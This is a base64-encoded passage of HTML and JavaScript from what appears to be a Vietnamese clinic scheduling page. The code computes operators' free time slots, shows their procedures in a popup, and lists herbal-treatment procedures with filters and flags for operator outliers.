2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vbkVuZCA9IDE3ICogMzYwMDsNCg0KICAgICAgICBjb25zdCBtb3JuaW5nRnJlZSA9IGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBtb3JuaW5nU3RhcnQsIG1vcm5pbmdFbmQpOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25GcmVlID0gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIGFmdGVybm9vblN0YXJ0LCBhZnRlcm5vb25FbmQpOw0KDQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPjxhIGhyZWY9IiMiIG9uY2xpY2s9InNob3dQcm9jZWR1cmVzRm9yT3BlcmF0b3IoXGAke29wZXJhdG9yfVxgLCBcYCR7ZGF0ZX1cYCk7cmV0dXJuIGZhbHNlOyIgc3R5bGU9ImNvbG9yOiMzNDk4ZGI7Zm9udC13ZWlnaHQ6Ym9sZCI+JHtvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L2E+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2RhdGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke21vcm5pbmdGcmVlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHthZnRlcm5vb25GcmVlfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCg0KZnVuY3Rpb24gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIHN0YXJ0LCBlbmQpIHsNCiAgICBjb25zdCBidXN5ID0gcHJvY2VkdXJlcy5tYXAocCA9PiAoew0KICAgICAgICBzdGFydDogcC5zdGFydCwNCiAgICAgICAgZW5kOiBwLmVuZCArICgocC5wcm9jZWR1cmVJbmZvPy5idWZmZXIgfHwgMCkgKiA2MCkNCiAgICB9KSkuZmlsdGVyKHAgPT4gcC5lbmQgPiBzdGFydCAmJiBwLnN0YXJ0IDwgZW5kKTsNCg0KICAgIGJ1c3kuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgY29uc3QgZnJlZSA9IFtdOw0KICAgIGxldCBjdXJzb3IgPSBzdGFydDsNCg0KICAgIGZvciAoY29uc3QgYiBvZiBidXN5KSB7DQogICAgICAgIGlmIChiLnN0YXJ0ID4gY3Vyc29yICYmIGIuc3RhcnQgPiBzdGFydCAmJiBjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgICAgIGNvbnN0IGZyZWVTdGFydCA9IE1hdGgubWF4KGN1cnNvciwgc3RhcnQpOw0KICAgICAgICAgICAgY29uc3QgZnJlZUVuZCA9IE1hdGgubWluKGIuc3RhcnQsIGVuZCk7DQogICAgICAgICAgICBpZiAoZnJlZUVuZCA+IGZyZWVTdGFydCkgew0KICAgICAgICAgICAgICAgIGZyZWUucHVzaChgJHtmb3JtYXRUaW1lKGZyZWVTdGFydCl9IC0gJHtmb3JtYXRUaW1lKGZyZWVFbmQpfWApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGN1cnNvciA9IE1hdGgubWF4KGN1cnNvciwgYi5lbmQpOw0KICAgIH0NCg0KICAgIGlmIChjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgZnJlZS5wdXNoKGAke2Zvcm1hdFRpbWUoY3Vyc29yKX0gLSAke2Zvcm1hdFRpbWUoZW5kKX1gKTsNCiAgICB9DQoNCiAgICByZXR1cm4gZnJlZS5sZW5ndGggPyBmcmVlLmpvaW4oJzxicj4nKSA6ICc8aT5LaMO0bmcgY8OybiB0cuG7kW5nPC9pPic7DQp9DQoNCmZ1bmN0aW9uIGZvcm1hdFRpbWUoc2VjKSB7DQogICAgY29uc3QgaCA9IE1hdGguZmxvb3Ioc2VjIC8gMzYwMCk7DQogICAgY29uc3QgbSA9IE1hdGguZmxvb3IoKHNlYyAlIDM2MDApIC8gNjApOw0KICAgIHJldHVybiBoLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKSArICdoJyArIG0udG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpOw0KfQ0KDQpmdW5jdGlvbiBzaG93UHJvY2VkdXJlc0Zvck9wZXJhdG9yKG9wZXJhdG9yLCBkYXRlKSB7DQogICAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVPdmVybGF5Jyk7DQogICAgY29uc3QgY29udGVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwb3B1cENvbnRlbnQnKTsNCiAgICBjb25zdCBsaXN0ID0gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLm9wZXJhdG9yID09PSBvcGVyYXRvciAmJiBwLmRhdGUgPT09IGRhdGUpOw0KDQogICAgaWYgKGxpc3QubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxpPktow7RuZyB0w6xtIHRo4bqleSB0aOG7pyB0aHXhuq10PC9pPiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgbGlzdC5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxiPk5nxrDhu51pIHRo4buxYyBoaeG7h246PC9iPiAiICsgb3BlcmF0b3IgKyAiPGJyPjxiPk5nw6B5OjwvYj4gIiArIGRhdGUgKyAiPGJyPjxicj4iICsNCiAgICAgICAgICAgICI8dWwgc3R5bGU9J3BhZGRpbmctbGVmdDoyMHB4Jz4iICsgbGlzdC5tYXAocCA9PiANCiAgICAgICAgICAgICAgICAiPGxpPjxiPiIgKyBwLnBhdGllbnROYW1lICsgIjwvYj4gLSAiICsgcC5wcm9jZWR1cmUgKyAiICgiICsgcC5kaXNwbGF5U3RhcnQgKyAiIOKGkiAiICsgcC5kaXNwbGF5RW5kICsgIik8L2xpPiINCiAgICAgICAgICAgICkuam9pbignJykgKyAiPC91bD4iOw0KICAgIH0NCg0KICAgIG92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQp9DQoNCmZ1bmN0aW9uIGNsb3NlUHJvY2VkdXJlUG9wdXAoKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZU92ZXJsYXknKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KfQ0KPC9zY3JpcHQ+DQo8IS0tIFBvcHVwIHRo4bunIHRodeG6rXQgY2hpIHRp4bq/dCB24bubaSBvdmVybGF5IC0tPg0KPGRpdiBpZD0icHJvY2VkdXJlT3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC40KTt6LWluZGV4OjEwMDAwIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVBvcHVwKCkiPg0KICA8ZGl2IGlkPSJwcm9jZWR1cmVQb3B1cCIgb25jbGljaz0iZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCkiIHN0eWxlPSJwb3NpdGlvbjpyZWxhdGl2ZTt0b3A6MTAlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpO2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO2JvcmRlcjoycHggc29saWQgIzM0OThkYjtwYWRkaW5nOjIwcHg7Ym9yZGVyLXJhZGl1czo4cHg7Ym94LXNoYWRvdzowIDVweCAyMHB4IHJnYmEoMCwwLDAsMC4zKTttYXgtaGVpZ2h0Ojcwdmg7b3ZlcmZsb3c6YXV0bztmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmO21heC13aWR0aDo2MDBweCI+DQogICAgPGgzPkNoaSB0aeG6v3QgdGjhu6cgdGh14bqtdDwvaDM+DQogICAgPGRpdiBpZD0icG9wdXBDb250ZW50Ij48L2Rpdj4NCiAgICA8YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVQb3B1cCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gcmVuZGVySGVyYkxpc3QoKSB7DQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRhYmxlQm9keScpOw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgY29uc3QgaGVyYnMgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW107DQogICAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRG9jdG9yRmlsdGVyJyk7DQoNCiAgICBpZiAoIWRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCkgew0KICAgICAgICBjb25zdCB1bmlxdWVEYXRlcyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoID0+IGguZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCB1bmlxdWVEb2N0b3JzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGggPT4gaC5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnKSldLnNvcnQoKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURhdGVzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgZG9jdG9yRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURvY3RvcnMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAidHJ1ZSI7DQogICAgICAgIGRhdGVGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgICAgICBkb2N0b3JGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgIH0NCg0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRhdGVGaWx0ZXIudmFsdWU7DQogICAgY29uc3Qgc2VsZWN0ZWREb2N0b3IgPSBkb2N0b3JGaWx0ZXIudmFsdWU7DQoNCiAgICBjb25zdCBmaWx0ZXJlZEhlcmJzID0gaGVyYnMuZmlsdGVyKHAgPT4NCiAgICAgICAgKHNlbGVjdGVkRGF0ZSA9PT0gJ2FsbCcgfHwgcC5kYXRlID09PSBzZWxlY3RlZERhdGUpICYmDQogICAgICAgIChzZWxlY3RlZERvY3RvciA9PT0gJ2FsbCcgfHwgcC5kb2N0b3IgPT09IHNlbGVjdGVkRG9jdG9yKQ0KICAgICk7DQoNCiAgICBpZiAoZmlsdGVyZWRIZXJicy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgPHRkIGNvbHNwYW49IjUiPjxjZW50ZXI+S2jDtG5nIGPDsyBk4buvIGxp4buHdSBz4bqvYyB0aHXhu5FjIHRoYW5nPC9jZW50ZXI+PC90ZD5gOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgZmlsdGVyZWRIZXJicy5mb3JFYWNoKHAgPT4gew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSDihpIgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3Aub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9KTsNCn0NCg0KDQpmdW5jdGlvbiB0b2dnbGVIZXJiTGlzdCgpIHsNCiAgICBjb25zdCB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiUHJvY2VkdXJlVGFibGUnKTsNCiAgICBpZiAodGFibGUuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICByZW5kZXJIZXJiTGlzdCgpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgfQ0KfQ0KPC9zY3JpcHQ+DQoNCg0KDQo8c2NyaXB0Pg0KKGZ1bmN0aW9uKCl7DQogIC8qID09PT0gVEnhu4ZOIMONQ0ggQ0hV4bqoTiBIT8OBIFTDik4gPT09PSAqLw0KICBmdW5jdGlvbiBjbGVhbkRpc3BsYXkobmFtZSl7DQogICAgcmV0dXJuIChuYW1lfHwnJykNCiAgICAgIC50b1N0cmluZygpDQogICAgICAucmVwbGFjZSgvWyzvvIxdK1xzKiQvLCcnKQ0KICAgICAgLnJlcGxhY2UoL1xzKy9nLCcgJykNCiAgICAgIC50cmltKCk7DQogIH0NCiAgZnVuY3Rpb24gbm9ybShuYW1lKXsNCiAgICByZXR1cm4gY2xlYW5EaXNwbGF5KG5hbWUpLnRvTG93ZXJDYXNlKCk7DQogIH0NCg0KICAvKiA9PT09IFTDjU5IIMSQQSBT4buQIFRIRU8gTkfDgFkgPT09PSAqLw0KICBmdW5jdGlvbiBjb21wdXRlTWFqb3JpdHlCeURhdGUocm93cyl7DQogICAgY29uc3QgbWFwID0gT2JqZWN0LmNyZWF0ZShudWxsKTsNCiAgICByb3dzLmZvckVhY2gocj0+ew0KICAgICAgY29uc3QgZCA9IHIuZGF0ZTsNCiAgICAgIGNvbnN0IG4gPSBub3JtKHIub3BlcmF0b3IpOw0KICAgICAgaWYoIW4gfHwgbiA9PT0gJ2tow7RuZyBjw7MnKSByZXR1cm47DQogICAgICAobWFwW2RdfHwobWFwW2RdPXt9KSlbbl0gPSAobWFwW2RdW25dfHwwKSsxOw0KICAgIH0pOw0KICAgIGNvbnN0IG91dCA9IHt9Ow0KICAgIE9iamVjdC5rZXlzKG1hcCkuZm9yRWFjaChkPT57DQogICAgICBjb25zdCBhcnIgPSBPYmplY3QuZW50cmllcyhtYXBbZF0pLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgICBjb25zdCB0b3AgPSBhcnJbMF0gfHwgW251bGwsMF07DQogICAgICBjb25zdCBzZWNvbmQgPSBhcnJbMV0gfHwgW251bGwsMF07DQogICAgICBvdXRbZF0gPSB7IHRvcE5vcm06dG9wWzBdLCB0b3BDb3VudDp0b3BbMV0sIHNlY29uZENvdW50OnNlY29uZFsxXSB9Ow0KICAgIH0pOw0KICAgIHJldHVybiBvdXQ7DQogIH0NCg0KICAvKiA9PT09IFVJIFBI4bukOiBUw5NNIFThuq5UICsgUE9QVVAgPT09PSAqLw0KICBmdW5jdGlvbiBlbnN1cmVPdXRsaWVyVUkoKXsNCiAgICBjb25zdCBzdW1tYXJ5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyU3VtbWFyeScpOw0KICAgIGNvbnN0IG1vZGFsICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbCcpOw0KICAgIGlmKCFzdW1tYXJ5KSBjb25zb2xlLndhcm4oJ1RoaeG6v3UgI2hlcmJPdXRsaWVyU3VtbWFyeSB0cm9uZyBIVE1MIScpOw0KICAgIGlmKCFtb2RhbCkgICBjb25zb2xlLndhcm4oJ1RoaeG6v3UgI2hlcmJPdXRsaWVyTW9kYWwgdHJvbmcgSFRNTCEnKTsNCiAgICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJDbG9zZUJ0bicpOw0KICAgIGNvbnN0IGJhY2tkcm9wID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQmFja2Ryb3AnKTsNCiAgICBpZihidG4pIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT5tb2RhbC5zdHlsZS5kaXNwbGF5PSdub25lJyk7DQogICAgaWYoYmFja2Ryb3ApIGJhY2tkcm9wLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9Pm1vZGFsLnN0eWxlLmRpc3BsYXk9J25vbmUnKTsNCiAgfQ0KICBlbnN1cmVPdXRsaWVyVUkoKTsNCg0KICAvKiA9PT09IEdISSDEkMOIIEjDgE0gUkVOREVSID09PT0gKi8NCi8qID09PT0gR0hJIMSQw4ggSMOATSBSRU5ERVIgPT09PSAqLw0KDQovLyBoZWxwZXI6IHRy4bqjIHbhu4EgZGFuaCBzw6FjaCBuZ8OgeSBjw7MgY2Egc+G6r2MgdGh14buRYyBs4buXaQ0KZnVuY3Rpb24gZ2V0SGVyYkVycm9yRGF0ZXMoYWxsSGVyYnMpew0KICBjb25zdCBtYWpvcml0eSA9IGNvbXB1dGVNYWpvcml0eUJ5RGF0ZShhbGxIZXJicyk7DQogIGNvbnN0IGRhdGVzID0gbmV3IFNldCgpOw0KDQogIGFsbEhlcmJzLmZvckVhY2goaD0+ew0KICAgIGNvbnN0IG0gPSBtYWpvcml0eVtoLmRhdGVdOw0KICAgIGNvbnN0IGhhc01ham9yaXR5ID0gbSAmJiBtLnRvcE5vcm0gJiYgbS50b3BDb3VudCA+IG0uc2Vjb25kQ291bnQ7DQogICAgaWYoaGFzTWFqb3JpdHkgJiYgaC5vcE5vcm0gIT09IG0udG9wTm9ybSl7DQogICAgICBkYXRlcy5hZGQoaC5kYXRlKTsNCiAgICB9DQogIH0pOw0KDQogIHJldHVybiBBcnJheS5mcm9tKGRhdGVzKTsNCn0NCg0Kd2luZG93LnJlbmRlckhlcmJMaXN0ID0gZnVuY3Rpb24oKXsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRhYmxlQm9keScpOw0KICBjb25zdCBkYXRlRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEYXRlRmlsdGVyJyk7DQogIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRG9jdG9yRmlsdGVyJyk7DQogIGNvbnN0IHN1bW1hcnlEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJTdW1tYXJ5Jyk7DQogIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWwnKTsNCiAgY29uc3QgbW9kYWxCb2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWxCb2R5Jyk7DQogIGNvbnN0IG1vZGFsSW5mbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsSW5mbycpOw0KICBjb25zdCBvbmx5RXJyb3JEYXlzQ2IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0hlcmJFcnJvckRheXNDaGVja2JveCcpOw0KDQogIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogIGNvbnN0IGhlcmJzUmF3ID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzIHx8IFtdOw0KICBsZXQgaGVyYnMgPSBoZXJic1Jhdy5tYXAoaD0+KHsNCiAgICAuLi5oLA0KICAgIG9wQ2xlYW46IGNsZWFuRGlzcGxheShoLm9wZXJhdG9yKSwNCiAgICBvcE5vcm06IG5vcm0oaC5vcGVyYXRvcikNCiAgfSkpOw0KDQogIC8vIG7hur91IGNoZWNrYm94IGLhuq10IHRow6wgbOG7jWMgbOG6oWkgaGVyYnMgY2jhu4kgY8OybiBuaOG7r25nIG5nw6B5IGPDsyBs4buXaQ0KICBpZihvbmx5RXJyb3JEYXlzQ2IgJiYgb25seUVycm9yRGF5c0NiLmNoZWNrZWQpew0KICAgIGNvbnN0IGVycm9yRGF0ZXMgPSBnZXRIZXJiRXJyb3JEYXRlcyhoZXJicyk7DQogICAgaGVyYnMgPSBoZXJicy5maWx0ZXIoaCA9PiBlcnJvckRhdGVzLmluY2x1ZGVzKGguZGF0ZSkpOw0KICAgIGlmKHN1bW1hcnlEaXYpew0KICAgICAgaWYoZXJyb3JEYXRlcy5sZW5ndGgpew0KICAgICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTCA9IGA8Yj7EkGFuZyBoaeG7g24gdGjhu4sgY8OhYyBuZ8OgeSBjw7MgbOG7l2kgc+G6r2MgdGh14buRYzo8L2I+ICR7ZXJyb3JEYXRlcy5qb2luKCcsICcpfWA7DQogICAgICB9IGVsc2Ugew0KICAgICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MID0gJyc7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgLy8ga2jhu59pIHThuqFvIHNlbGVjdCBu4bq/dSBjaMawYQ0KICBpZighZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkKXsNCiAgICBjb25zdCB1bmlxdWVEYXRlcyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoPT5oLmRhdGUpKV0uc29ydCgoYSxiKT0+ew0KICAgICAgY29uc3QgW2RhLG1hLHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgIGNvbnN0IFtkYixtYix5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICByZXR1cm4gbmV3IERhdGUoeWEsbWEtMSxkYSkgLSBuZXcgRGF0ZSh5YixtYi0xLGRiKTsNCiAgICB9KTsNCiAgICBjb25zdCB1bmlxdWVEb2N0b3JzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGg9PmguZG9jdG9yfHwnS2jDtG5nIGPDsycpKV0uc29ydCgpOw0KICAgIGRhdGVGaWx0ZXIuaW5uZXJIVE1MID0NCiAgICAgICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgIHVuaXF1ZURhdGVzLm1hcChkPT5gPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIGRvY3RvckZpbHRlci5pbm5lckhUTUwgPQ0KICAgICAgJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPicgKw0KICAgICAgdW5pcXVlRG9jdG9ycy5tYXAoZD0+YDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICBkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQogICAgZGF0ZUZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB3aW5kb3cucmVuZGVySGVyYkxpc3QpOw0KICAgIGRvY3RvckZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB3aW5kb3cucmVuZGVySGVyYkxpc3QpOw0KICAgIGlmKG9ubHlFcnJvckRheXNDYil7DQogICAgICBvbmx5RXJyb3JEYXlzQ2IuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgd2luZG93LnJlbmRlckhlcmJMaXN0KTsNCiAgICB9DQogIH0NCg0KICBjb25zdCBzZWxlY3RlZERhdGUgPSBkYXRlRmlsdGVyLnZhbHVlOw0KICBjb25zdCBzZWxlY3RlZERvY3RvciA9IGRvY3RvckZpbHRlci52YWx1ZTsNCg0KICBjb25zdCBmaWx0ZXJlZCA9IGhlcmJzLmZpbHRlcihwID0+DQogICAgKHNlbGVjdGVkRGF0ZSA9PT0gJ2FsbCcgfHwgcC5kYXRlID09PSBzZWxlY3RlZERhdGUpICYmDQogICAgKHNlbGVjdGVkRG9jdG9yID09PSAnYWxsJyB8fCBwLmRvY3RvciA9PT0gc2VsZWN0ZWREb2N0b3IpDQogICk7DQoNCiAgaWYoZmlsdGVyZWQubGVuZ3RoID09PSAwKXsNCiAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgdHIuY2xhc3NOYW1lID0gJ2hlcmItcm93JzsNCiAgICB0ci5pbm5lckhUTUwgPSAnPHRkIGNvbHNwYW49IjUiPjxjZW50ZXI+S2jDtG5nIGPDsyBk4buvIGxp4buHdSBz4bqvYyB0aHXhu5FjIHRoYW5nPC9jZW50ZXI+PC90ZD4nOw0KICAgIHRib2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgICBpZihzdW1tYXJ5RGl2KSBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIGNvbnN0IG1ham9yaXR5ID0gY29tcHV0ZU1ham9yaXR5QnlEYXRlKGhlcmJzKTsNCiAgY29uc3Qgb3V0bGllcnNJblZpZXcgPSBbXTsNCg0KICBmaWx0ZXJlZC5mb3JFYWNoKHA9PnsNCiAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgdHIuY2xhc3NOYW1lID0gJ2hlcmItcm93JzsNCiAgICBjb25zdCBtID0gbWFqb3JpdHlbcC5kYXRlXTsNCiAgICBjb25zdCBoYXNNYWpvcml0eSA9IG0gJiYgbS50b3BOb3JtICYmIG0udG9wQ291bnQgPiBtLnNlY29uZENvdW50Ow0KICAgIGlmKGhhc01ham9yaXR5ICYmIHAub3BOb3JtICE9PSBtLnRvcE5vcm0pew0KICAgICAgdHIuY2xhc3NMaXN0LmFkZCgnaGVyYi1vdXRsaWVyJyk7DQogICAgICBvdXRsaWVyc0luVmlldy5wdXNoKHApOw0KICAgIH0NCiAgICB0ci5pbm5lckhUTUwgPSBgDQogICAgICA8dGQ+JHtwLnBhdGllbnROYW1lfTwvdGQ+DQogICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0gJnJhcnI7ICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICA8dGQ+JHtwLm9wQ2xlYW59PC90ZD4NCiAgICBgOw0KICAgIHRib2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgfSk7DQoNCiAgaWYoc3VtbWFyeURpdiAmJiAoIW9ubHlFcnJvckRheXNDYiB8fCAhb25seUVycm9yRGF5c0NiLmNoZWNrZWQpKXsNCiAgICBpZihvdXRsaWVyc0luVmlldy5sZW5ndGgpew0KICAgICAgc3VtbWFyeURpdi5zdHlsZS5k